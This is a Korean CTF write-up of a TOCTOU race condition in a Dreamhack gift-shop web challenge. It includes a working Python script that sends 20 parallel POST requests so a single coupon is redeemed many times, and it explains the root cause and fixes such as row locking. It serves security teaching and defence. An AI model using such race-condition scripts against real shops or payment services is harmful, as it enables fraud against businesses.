---
title: "Dreamhack Web GiftShop Write-up"
date: 2026-07-02
categories:
  - CTF
  - Web Hacking
tags:
  - TOCTOU
  - Race Condition
---

해당 웹페이지는 평소에는 다음과 같은 순서로 작동한다
1. 입장권 발급


2. 쿠폰 발급
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/14694c6fd4ad67f12bb6983df7df8b513dc23dc99752b845d7ff872db568f7ed.png)

3. 쿠폰 등록
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/af1cc06f537dc64cc5da17f4d97cd6acc257584a03a7a41100e6d849a4cf3117.png)

4. 상품 구매
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/cac905c2b8312f19901b2c697842818d2653fe551da0e2a05a49a98596529b07.png)

그러나 한 입장권 당 쿠폰은 한번만 사용할 수 있고 이후에는 추가 쿠폰 발급 및 추가 쿠폰 사용이 불가능하다.

즉 정상적으로는 한번에 최대 만원만 얻을 수 있는 것으로 보인다.

이제 문제 코드를 살펴보자
읽다보면 계속 본것과 같은 메커니즘으로 작동한다는 것을 알 수 있고 prepared statement를 잘 활용하고 있어 sql injection은 안될 것 같다.

그런데 이벤트 쿠폰을 등록하는 부분을 보면 이상한 점이 있다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/490438b5bca8cc091b3a5d863dbb7536db7d069619afb725538fcc30dd718fe6.png)

포인트를 증가시키는 것과 regcup, used 값을 설정하는 것 사이에 sleep(3) 구문이 있다.
즉 3초안에 다량의 패킷을 보내면 이미 사용한 쿠폰으로 등록되기 전에 쿠폰을 중복해서 사용할 수 있을 것으로 보인다. 이를 바탕으로 파이썬 스크립트를 작성해서 실행시키면 플래그를 얻을 수 있다.

```
import threading
import requests

url = "http://host3.dreamhack.games:13092/?page=coupon"
data = {
    "ticket_number": "3911379879556664",
    "coupon_number": "DZPBOE3Y2RUUVSO5",
    "register_coupon": ""
}

def send_request():
    try:
        response = requests.post(url, data=data, timeout=10)
        print(response.status_code, "포인트 증가 성공 여부 확인")
    except Exception as e:
        print("에러:", e)

threads = []
# 16번 이상 동시 요청 실행
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
```

이 취약점은 TOCTOU(Time-of-check to time-of-use) 취약점으로 불리며 검사 시점과 사용 시점의 사이에 발생할 수 있는 취약점을 일컫는다

해당 취약점이 발생하는 이유는 웹 서버(예: Apache, Nginx + PHP-FPM)가 동시에 여러 사용자의 접속을 처리하기 위해 **멀티프로세스** 혹은 **멀티스레드** 방식을 사용하기 때문이다
- 사용자 A와 사용자 B가 동시에 웹 페이지를 요청하면, 웹 서버는 각각 독립된 작업 공간(스레드 또는 프로세스)을 생성하여 동일한 코드를 **동시에 각자 실행**한다.
- 그렇기 때문에 사용자가 동시에 요청했을 때 서로 간섭하지 않고 실행되어 하나의 사용자에게 여러 쿠폰이 동시에 사용될 수 있다.

기본적으로 이런 취약점을 없애려면 3초의 sleep을 없애는게 제일 빠르고, 근본적인 문제를 조치하기 위해서는 데이터를 조회할 때 해당 행(Row)에 쓰기 잠금을 걸어, 조회가 완료되고 트랜잭션이 끝날 때까지 다른 세션이 해당 행을 읽거나 쓰지 못하도록 블로킹하면 된다.